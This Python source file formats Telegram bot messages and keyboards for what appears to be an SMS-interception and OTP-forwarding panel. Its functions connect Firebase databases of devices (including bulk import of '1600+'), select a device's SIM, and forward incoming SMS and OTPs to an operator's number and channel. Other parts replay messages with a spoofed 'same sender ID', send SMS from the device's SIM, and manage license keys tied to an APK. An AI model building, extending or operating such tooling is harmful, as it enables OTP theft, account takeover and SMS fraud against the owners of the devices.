import json
import secrets
from datetime import datetime, timezone

from telegram import InlineKeyboardButton, InlineKeyboardMarkup

from app.database import Device, MonitorProfile

STARTUP_TEST_SENDER = "BABY"
STARTUP_TEST_MESSAGE = "Chacha Ji Pani Pila Do"


def format_addchannel_card(channel_id: str, sim_slot: int = 1) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"Channel set (only this one monitored):\n"
        f"{channel_id}\n\n"
        "Make sure I am an ADMIN there!\n\n"
        f"📶 Selected SIM: SIM {sim_slot}\n"
        "Channel par SMS/OTP aaye → auto forward"
        "</pre>\n\n"
        "Next: <code>/startmonitor</code>"
    )


def format_firebase_connected_card(
    firebase_url: str,
    online_count: int,
    total: int = 0,
    device_ids: list[str] | None = None,
) -> str:
    device_line = (
        f"📱 Devices Found: {total} (online: {online_count})"
        if total
        else "📱 Devices: 0 (koi bhi Firebase chalega — /fdy se device add karo)"
    )
    ids_block = ""
    if device_ids:
        preview = device_ids[:12]
        ids_block = "\n\nIDs:\n" + "\n".join(f"• {device_id}" for device_id in preview)
        if len(device_ids) > 12:
            ids_block += f"\n... +{len(device_ids) - 12} more"
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Firebase Connected!\n\n"
        f"URL: {firebase_url}\n"
        f"{device_line}"
        f"{ids_block}"
        "</pre>\n\n"
        "Pick device: <code>/fdy &lt;device_id&gt;</code>\n"
        "Key wala: <code>/a &lt;device_id&gt;</code>"
    )


def short_device_id(name: str) -> str:
    return name[:8] if len(name) > 8 else name


def make_inject_key(device: Device) -> str:
    if device.api_key and device.api_key.startswith("KEY-"):
        return device.api_key
    raw = (device.api_key or secrets.token_hex(8)).replace("-", "").upper()[:16]
    return f"KEY-{raw[0:4]}-{raw[4:8]}-{raw[8:12]}-{raw[12:16]}"


def get_device_meta(device: Device) -> dict:
    if not hasattr(device, "device_meta") or not device.device_meta:
        return {}
    try:
        return json.loads(device.device_meta)
    except (json.JSONDecodeError, TypeError):
        return {}


def get_sim_list(device: Device) -> list[dict]:
    meta = get_device_meta(device)
    sims = meta.get("sims")
    if sims:
        return sims

    primary = device.phone_number or "Unknown"
    return [
        {"slot": 1, "index": 0, "carrier": "SIM 1", "number": primary},
        {"slot": 2, "index": 1, "carrier": "SIM 2", "number": meta.get("sim2", "N/A")},
    ]


def _is_valid_sim_number(number: str | None) -> bool:
    if not number:
        return False
    normalized = str(number).strip().upper()
    return normalized not in {"N/A", "UNKNOWN", "NA", "-", "NONE", ""}


def get_active_sims(device: Device) -> list[dict]:
    sims = get_sim_list(device)
    active = [sim for sim in sims if _is_valid_sim_number(sim.get("number"))]
    if active:
        return active
    return sims[:1] if sims else [{"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}]


def get_selected_sim(device: Device, sim_index: int = 0) -> dict:
    sims = get_sim_list(device)
    if 0 <= sim_index < len(sims):
        return sims[sim_index]
    active = get_active_sims(device)
    return active[0] if active else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}


def get_inject_key(profile: MonitorProfile | None, device: Device) -> str:
    license_key = (profile.license_key or "").strip().upper() if profile else ""
    if license_key.startswith("KEY-"):
        return license_key
    if device.api_key and str(device.api_key).upper().startswith("KEY-"):
        return str(device.api_key).upper()
    return make_inject_key(device)


def get_battery(device: Device) -> str:
    meta = get_device_meta(device)
    battery = meta.get("battery")
    if battery is not None:
        return f"{battery}%" if "%" not in str(battery) else str(battery)
    return meta.get("battery_level", "98%")


def get_model_name(device: Device) -> str:
    meta = get_device_meta(device)
    return meta.get("model") or meta.get("device_model") or "Unknown"


def format_device_set_card(
    device: Device,
    selected_sim: int = 0,
    *,
    found_ms: int | None = None,
    status: str = "online",
) -> str:
    sims = get_sim_list(device)
    active = sims[selected_sim] if sims else {"slot": 1, "index": 0, "carrier": "SIM 1", "number": "Unknown"}
    device_short = short_device_id(device.name)
    db_url = device.firebase_source_url or "Not linked"
    timing = f"\nFound in {found_ms}ms" if found_ms is not None else ""
    status_icon = "🟢" if status == "online" else "🟡"

    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Device Found &amp; Set!\n\n"
        f"📱 ID: {device_short}\n"
        f"📦 Model: {get_model_name(device)}\n"
        f"🔋 Battery: {get_battery(device)}\n"
        f"{status_icon} Status: {status.title()}\n"
        f"🔥 DB: {db_url}"
        f"{timing}\n\n"
        "⚠️ Previous monitoring was AUTO-STOPPED.\n"
        "Use /startmonitor again when ready.\n\n"
        "Select SIM to send FROM:"
        "</pre>\n"
        + "".join(
            f"\n📶 SIM {sim.get('slot', idx + 1)}: {sim.get('number', 'Unknown')}"
            for idx, sim in enumerate(get_active_sims(device))
        )
    )


def device_set_keyboard(device: Device) -> InlineKeyboardMarkup:
    rows = [
        [
            InlineKeyboardButton(
                f"📶 SIM {sim['slot']} ({sim.get('number', 'Unknown')})",
                callback_data=f"sim:{device.id}:{sim['index']}",
            )
        ]
        for sim in get_active_sims(device)
    ]
    rows.append([InlineKeyboardButton("📋 COPY CODE", callback_data=f"copy:{device.name}")])
    return InlineKeyboardMarkup(rows)


def sim_monitoring_keyboard(device: Device) -> InlineKeyboardMarkup:
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton(
                    "🟢 Monitoring ON...",
                    callback_data=f"monitor:start:{device.id}",
                ),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_sim_selected_card(device: Device, sim_index: int = 0) -> str:
    active = get_selected_sim(device, sim_index)
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
        f"📶 Selected: SIM {active.get('slot', 1)} ({active.get('number', 'Unknown')})"
        "</pre>\n\n"
        "Tap <b>Monitoring ON</b> to start\n"
        "Pehle <code>/mynum</code> + <code>/addchannel</code> set karo"
    )


def _short_channel_id(channel_id: str) -> str:
    if len(channel_id) > 12:
        return f"{channel_id[:5]}..."
    return channel_id


def format_timing_footer(queued_ms: int, total_ms: int) -> str:
    return f"⏱ queued {queued_ms}ms | total {total_ms}ms"


def format_virtus_startup_card(queued_ms: int = 3, total_ms: int = 15) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "⚡ INJECT FORWARDED! [STARTUP]\n\n"
        f"📤 Sender: {STARTUP_TEST_SENDER}\n"
        f"🔒 {STARTUP_TEST_MESSAGE}\n\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_virtus_stream_card(
    sender: str,
    message: str,
    queued_ms: int = 3,
    total_ms: int = 22,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 500:
        body = body[:500] + "..."
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "⚡ INJECT FORWARDED! [STREAM]\n\n"
        f"📤 Sender: {sender}\n"
        f"🔒 {body}\n\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_virtus_outgoing_sent_card(
    to_number: str,
    message: str,
    sim_slot: int = 1,
    queued_ms: int = 5,
    total_ms: int = 25,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 300:
        body = body[:300] + "..."
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "📤 OUTGOING SMS SENT! [CHANNEL]\n\n"
        f"📞 To: {to_number}\n"
        f"📶 SIM: {sim_slot}\n"
        f"🔒 {body}\n\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_virtus_channel_token_card(
    to_number: str,
    message: str,
    queued_ms: int = 5,
    total_ms: int = 29,
) -> str:
    body = message.replace("<", "").replace(">", "").strip()
    if len(body) > 500:
        body = body[:500] + "..."
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "🎯 TOKEN FORWARDED! [CHANNEL]\n\n"
        f"📞 To: {to_number}\n"
        f"🔒 {body}\n\n"
        f"{format_timing_footer(queued_ms, total_ms)}"
        "</pre>"
    )


def format_auto_stop_card(minutes: int = 15) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        f"⏱ Monitoring AUTO-STOPPED after {minutes} minutes.\n"
        "Use /startmonitor to start again."
        "</pre>"
    )


def format_monitoring_card(
    device: Device,
    profile: MonitorProfile,
    ignored_sms: int = 0,
    test_message: str | None = None,
) -> str:
    sim_index = profile.selected_sim_index or 0
    active_sim = get_selected_sim(device, sim_index)
    sim_slot = active_sim.get("slot", 1)
    sim_number = active_sim.get("number", "Unknown")
    target = profile.phone_number or "Not set"
    channel = profile.channel_id or str(profile.telegram_user_id)
    auto_stop = profile.auto_stop_minutes or 15
    inject_key = get_inject_key(profile, device)
    test_msg = test_message or STARTUP_TEST_MESSAGE

    card = (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "Monitoring Started!\n\n"
        f"📱 Device: {short_device_id(device.name)} | {get_model_name(device)}\n"
        f"📶 FROM SIM: {sim_slot} ({sim_number})\n"
        f"🔑 Inject Key: {inject_key}\n"
        "📤 Incoming -&gt; spoof inject (same sender ID)\n"
        f"📞 Real SMS -&gt; {target}\n"
        f"📢 Channel: {channel} (last / addchannel only)\n"
        f"⏱ Auto-stop in {auto_stop} minutes\n"
        f"📦 Ignored {ignored_sms} old SMS (only NEW after this moment)\n"
        f"✅ Test SMS sent: {test_msg}"
        "</pre>"
    )

    if test_message and test_message != "Monitoring active" and test_message != test_msg:
        card += f"\n\n<pre>🔒 Last SMS: {test_message[:80]}</pre>"

    return card


def monitoring_keyboard(device: Device | None = None) -> InlineKeyboardMarkup:
    start_data = f"monitor:start:{device.id}" if device else "monitor:on"
    return InlineKeyboardMarkup(
        [
            [
                InlineKeyboardButton("🟢 Monitoring ON...", callback_data=start_data),
                InlineKeyboardButton("🔴 STOP", callback_data="monitor:stop"),
            ]
        ]
    )


def format_welcome_message() -> str:
    return (
        "✨ <b>Welcome to Premium Automation</b>\n"
        "Fast, secure, and reliable OTP forwarding\n"
        "directly to your Firebase connected devices.\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "💉 <b>Injector Setup (Sender Spoof)</b>\n"
        "<pre>"
        "1. /key KEY-XXXX-XXXX-XXXX\n"
        "   License key (inject)\n"
        "2. /fy &lt;device_id&gt;  (key ke saath)\n"
        "   /fdy &lt;device_id&gt; (bina key)\n"
        "3. Pick SIM → /addchannel → /startmonitor\n"
        "   Incoming SMS replayed with SAME sender ID"
        "</pre>\n\n"
        "🔥 <b>Admin Setup (Firebase Panel)</b>\n"
        "<pre>"
        "1. /setfirebase &lt;url&gt;\n"
        "   Connect your Firebase DB\n"
        "2. /allfirebase\n"
        "   Bulk txt file import (1600+)\n"
        "3. /fb &lt;device_id&gt;\n"
        "   Find device &amp; select SIM\n"
        "4. /mynum &lt;number&gt;\n"
        "   Your forwarding number\n"
        "5. /addchannel &lt;id&gt;\n"
        "   Add group for monitoring\n"
        "6. /startmonitor\n"
        "   Start auto-forwarding"
        "</pre>\n\n"
        "👤 <b>User Setup</b>\n"
        "<pre>"
        "1. /setfirebase &lt;url&gt;\n"
        "2. /fdy &lt;id&gt;  device find (bina key)\n"
        "   /a &lt;id&gt;   key set hone ke baad\n"
        "3. /mynum &lt;number&gt;\n"
        "4. /addchannel &lt;id&gt;\n"
        "5. /startmonitor"
        "</pre>\n\n"
        "━━━━━━━━━━━━━━━━━━━━\n"
        "🎮 <b>Controls</b>\n"
        "<pre>"
        "/stop     Pause monitor\n"
        "/resume   Resume monitor\n"
        "/status   View current stats\n"
        "/send &lt;num&gt; &lt;msg&gt;  Manual SMS\n"
        "/ping     Check latency"
        "</pre>\n\n"
        "👥 <b>Extra (Virtus)</b>\n"
        "<pre>"
        "/key generate   → new license key\n"
        "/approve &lt;id&gt;  → user access\n"
        "/allfirebase    → bulk txt scan"
        "</pre>"
    )


def format_status_card(device: Device | None, profile: MonitorProfile | None, sms_count: int = 0) -> str:
    if not profile:
        return "❌ Profile not set. Use /setfirebase first."

    monitoring = "🟢 ON" if profile.is_monitoring else "🔴 OFF"
    device_name = short_device_id(device.name) if device else "Not set"
    sims = get_sim_list(device) if device else []
    sim_index = profile.selected_sim_index or 0
    sim_label = sims[sim_index]["carrier"] if sims else "N/A"

    return (
        "✅ <b>STATUS</b>\n\n"
        "<pre>"
        f"Monitor: {monitoring}\n"
        f"📱 Device: {device_name}\n"
        f"📶 SIM: {sim_label}\n"
        f"📞 My Number: {profile.phone_number or 'Not set'}\n"
        f"📢 Channel: {profile.channel_id or 'Not set'}\n"
        f"🔥 Firebase: {'Connected' if profile.firebase_url else 'Not set'}\n"
        f"📨 SMS Count: {sms_count}\n"
        f"⏱ Auto-stop: {profile.auto_stop_minutes or 15} min"
        "</pre>"
    )


def format_ping_card(latency_ms: int) -> str:
    return (
        "✅ <b>PONG</b>\n\n"
        "<pre>"
        f"🏓 Latency: {latency_ms}ms\n"
        "Bot is online and ready!"
        "</pre>"
    )


def format_key_error_card() -> str:
    return (
        "❌ <b>KEY HELP</b>\n\n"
        "<pre>"
        "/key generate\n"
        "  → Nayi license key (max 2 devices)\n\n"
        "/key KEY-XXXX-XXXX-XXXX\n"
        "  → License key set karo\n\n"
        "/key status KEY-XXXX...\n"
        "  → Devices + APK status\n"
        "/key confirm\n"
        "  → APK attach confirm (manual)\n\n"
        "Firebase alag command se:\n"
        "/setfirebase &lt;url&gt;\n"
        "/allfirebase → .txt file attach"
        "</pre>"
    )


def format_key_generated_card(license_key: str) -> str:
    return (
        "✅ <b>KEY GENERATED</b>\n\n"
        "<pre>"
        f"🔑 {license_key}\n"
        "📱 Max devices: 2\n"
        "⏸ Polling: OFF (jab tak /startmonitor na ho)\n\n"
        "Next:\n"
        "1. /key " + license_key + "\n"
        "2. APK mein SAME key + START SERVICE\n"
        "3. /fy &lt;device_id&gt; → /mynum → /addchannel\n"
        "4. /startmonitor (tabhi polling ON)"
        "</pre>"
    )


def format_key_set_card(inject_key: str) -> str:
    return (
        "✅ <b>KEY SET</b>\n\n"
        "<pre>"
        f"🔑 {inject_key}\n"
        "📱 Max: 2 devices\n"
        "⏸ Polling: OFF\n\n"
        "APK mein SAME key daalo + START SERVICE\n"
        "(jab tak APK attach na ho, /startmonitor block)\n\n"
        "Next:\n"
        "/fdy &lt;device_id&gt; → SIM pick (bina key)\n"
        "/a &lt;device_id&gt; → key ke saath pick\n"
        "/mynum &lt;number&gt;\n"
        "/addchannel → /startmonitor"
        "</pre>"
    )


def format_license_key_set_card(firebase_url: str) -> str:
    return (
        "✅ <b>SUCCESS</b>\n\n"
        "<pre>"
        "License Key Set!\n\n"
        f"🔑 {firebase_url.upper()}\n\n"
        "Koi bhi Firebase URL chalega — APK mein bhi same daalo\n\n"
        "Next: /fy &lt;device_id&gt; → SIM → /mynum → /startmonitor"
        "</pre>"
    )


def format_send_queued(to_number: str, message: str, sim_slot: int) -> str:
    return (
        "✅ <b>SMS Queued</b>\n\n"
        "<pre>"
        f"📶 SIM: {sim_slot}\n"
        f"📞 To: {to_number}\n"
        f"💬 {message[:200]}"
        "</pre>"
    )


def update_device_meta(device: Device, data: dict) -> dict:
    meta = get_device_meta(device)
    meta.update(data)
    return meta
